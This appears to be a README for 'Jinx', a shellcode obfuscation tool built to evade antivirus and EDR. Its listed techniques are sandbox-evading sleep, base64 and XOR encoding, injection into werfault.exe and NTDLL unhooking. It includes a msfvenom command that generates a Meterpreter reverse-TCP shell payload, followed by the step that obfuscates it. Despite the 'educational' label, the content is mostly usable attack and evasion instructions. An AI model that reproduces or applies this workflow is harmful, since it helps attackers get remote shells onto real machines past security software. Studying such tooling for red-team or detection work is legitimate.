# Jinx (For Educational Purposes Only)
## Shellcode obfuscation tool to avoid AV/EDR
[![Python 3.10.4](https://img.shields.io/badge/python-3.10.4-yellow.svg)](https://www.python.org/) [![](https://img.shields.io/badge/C%2B%2B-20-blue)](https://visualstudio.microsoft.com/vs/features/cplusplus/)
## Features
 
 - Custom Sleep Function - to bypass sandbox.
- Obfuscation- base64 encoding and xor encryption with randomly generated key.
- Process Injection - injecting the payload to werfault.exe.
- DLL Unhooking - full unhook of NTDLL.DLL.

## Installation and use
Jinx require [Python3](https://www.python.org/) and C++ compiler to run (we will be using [Visual Studio](https://visualstudio.microsoft.com/vs/features/cplusplus/))

in this demonstration we will generate a shellcode using msfvenom in our kali machine:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp -lhost eth0 -lport 1337 -f raw -o shellcode
```

next we will use the obfuscator.py tool to obfuscate the shellcode:

```
python obfuscator.py <path to shellcode>/shellcode
```
our shellcode then be obfuscated in the file - obfuscatedPayload.bin with the key - key.bin
